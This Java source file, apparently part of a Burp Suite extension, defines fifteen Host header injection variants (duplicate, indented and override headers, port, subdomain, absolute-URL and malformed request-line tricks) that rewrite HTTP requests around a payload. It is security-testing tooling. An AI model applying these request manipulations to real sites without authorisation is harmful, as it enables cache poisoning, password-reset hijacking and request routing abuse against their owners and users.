package burp;

import java.util.List;
import java.util.function.BiFunction;

import static burp.Utils.*;

enum HostHeaderInjection {

    ARBITRARY("Arbitrary Host Header",
            HostHeaderInjection::generateArbitraryHostHeader,
            "Host: [PAYLOAD]"),

    DUPLICATE_AFTER_HOST("Duplicate Host Header After Host Header",
            HostHeaderInjection::generateDuplicatedHostHeaderAfter,
            "Host: www.example.com\nHost: [PAYLOAD]"),

    DUPLICATE_BEFORE_HOST("Duplicate Host Header Before Host Header",
            HostHeaderInjection::generateDuplicatedHostHeaderBefore,
            "Host: [PAYLOAD]\nHost: www.example.com"),

    INDENTED_AFTER_HOST("Indented Host Header After Host Header",
            HostHeaderInjection::generateIndentedHostHeaderAfter,
            "Host: www.example.com\n\sHost: [PAYLOAD]"),

    INDENTED_BEFORE_HOST("Indented Host Header Before Host Header",
            HostHeaderInjection::generateIndentedHostHeaderBefore,
            "\sHost: [PAYLOAD]\nHost: www.example.com"),

    X_HOST("X-Host Header",
            HostHeaderInjection::generateXHostHostHeader,
            "Host: www.example.com\nX-Host: [PAYLOAD]"),

    X_FORWARDED_SERVER("X-Forwarded-Server Header",
            HostHeaderInjection::generateXForwardedServerHostHeader,
            "Host: www.example.com\nX-Forwarded-Server: [PAYLOAD]"),

    X_HTTP_HOST_OVERRIDE("X-HTTP-Host-Override Header",
            HostHeaderInjection::generateXHTTPHostOverrideHostHeader,
            "Host: www.example.com\nX-HTTP-Host-Override: [PAYLOAD]"),

    FORWARDED("Forwarded Header",
            HostHeaderInjection::generateForwardedHostHeader,
            "Host: www.example.com\nForwarded: [PAYLOAD]"),

    PAYLOAD_IN_PORT_SECTION("Payload in The Port Section",
            HostHeaderInjection::generatePayloadInPortHostHeader,
            "Host: www.example.com:[PAYLOAD]"),

    SUBDOMAIN("Subdomain",
            HostHeaderInjection::generateSubdomainHostHeader,
            "Host: [PAYLOAD].example.com"),

    INJECTION_BEFORE_HOST("Injection Before Host",
            HostHeaderInjection::generateInjectionBeforeHostHeader,
            "Host: [PAYLOAD]-www.example.com"),

    INJECTION_AFTER_HOST("Injection After Host",
            HostHeaderInjection::generateInjectionAfterHostHeader,
            "Host: www.example.com-[PAYLOAD]"),

    ABSOLUT_URL("Absolute URL",
            HostHeaderInjection::generateAbsoluteUrl,
            "GET https://[PAYLOAD]/ HTTP/1.1\nHost: www.example.com"),

    MALFORMED_REQUEST_LINE("Malformed Request Line",
            HostHeaderInjection::generateMalformedRequestLine,
            "GET @[PAYLOAD]/example HTTP/1.1\nHost: www.example.com\n");

    private final String name;
    private final BiFunction<String, List<String>, List<String>> patcher;
    private final String description;

    HostHeaderInjection(
            String name,
            BiFunction<String, List<String>, List<String>> patcher,
            String description) {
        this.name = name;
        this.patcher = patcher;
        this.description = description;
    }

    String title() {
        return this.name;
    }

    List<String> patchHeader(String payload, List<String> headers) {
        return this.patcher.apply(payload, headers);
    }

    String description() {
        return this.description;
    }

    private static List<String> generateArbitraryHostHeader(String payload, List<String> headers) {
        return rewriteHostHeader(headers, hostHeader -> payload);
    }

    private static List<String> generateDuplicatedHostHeaderAfter(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "Host: " + payload);
    }

    private static List<String> generateDuplicatedHostHeaderBefore(String payload, List<String> headers) {
        return addHeaderBeforeHostHeader(headers, "Host: " + payload);
    }

    private static List<String> generateIndentedHostHeaderAfter(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "\sHost: " + payload);
    }

    private static List<String> generateIndentedHostHeaderBefore(String payload, List<String> headers) {
        return addHeaderBeforeHostHeader(headers, "\sHost: " + payload);
    }

    private static List<String> generateXHostHostHeader(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "X-Host: " + payload);
    }

    private static List<String> generateXForwardedServerHostHeader(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "X-Forwarded-Server: " + payload);
    }

    private static List<String> generateXHTTPHostOverrideHostHeader(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "X-HTTP-Host-Override: " + payload);
    }

    private static List<String> generateForwardedHostHeader(String payload, List<String> headers) {
        return addHeaderAfterHostHeader(headers, "Forwarded: " + payload);
    }

    private static List<String> generatePayloadInPortHostHeader(String payload, List<String> headers) {
        return rewriteHostHeader(headers, hostHeader -> hostHeader + ":" + payload);
    }

    private static List<String> generateSubdomainHostHeader(String payload, List<String> headers) {
        return rewriteHostHeader(headers, hostHeader -> payload + "." + hostHeader);
    }

    private static List<String> generateInjectionBeforeHostHeader(String payload, List<String> headers) {
        return rewriteHostHeader(headers, hostHeader -> payload + "-" + hostHeader);
    }

    private static List<String> generateInjectionAfterHostHeader(String payload, List<String> headers) {
        return rewriteHostHeader(headers, hostHeader -> hostHeader + "-" + payload);
    }

    private static List<String> generateAbsoluteUrl(String payload, List<String> headers) {
        var modifiedHeaders = rewriteUrl(headers, (url, hostHeader) -> {
            var urlParts = url.split("\s");
            var hostHeaderParts = hostHeader.split(":");
            return String.format("%s\shttps://%s%s\s%s", urlParts[0], hostHeaderParts[1].trim(), urlParts[1], urlParts[2]);
        });
        return rewriteHostHeader(modifiedHeaders, hostHeader -> payload);
    }

    private static List<String> generateMalformedRequestLine(String payload, List<String> headers) {
        return rewriteUrl(headers, (url, hostHeader) -> {
            var urlParts = url.split("\s");
            return String.format("%s\s@%s%s\s%s", urlParts[0], payload, urlParts[1], urlParts[2]);
        });
    }
}
